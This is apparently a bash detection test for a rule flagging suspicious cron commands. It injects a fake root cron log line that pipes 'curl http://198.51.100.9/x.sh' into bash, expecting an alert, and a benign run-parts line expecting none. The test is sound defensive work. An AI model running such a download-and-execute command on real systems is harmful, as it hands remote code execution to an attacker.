#!/usr/bin/env bash
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"; source "$DIR/lib.sh"
detection_test "1006-cron-suspicious-command — download-and-execute in cron"
rc=0
base=$(count_rule "1006-cron-suspicious-command")
inject '<78>Jul  1 00:00:00 victim CRON[1]: (root) CMD (curl http://198.51.100.9/x.sh | bash)'
expect_new_rule "1006-cron-suspicious-command" "$base" || rc=1
base=$(count_rule "1006-cron-suspicious-command")
inject '<78>Jul  1 00:00:00 victim CRON[1]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)'
expect_no_new_rule "1006-cron-suspicious-command" "$base" || rc=1
exit $rc
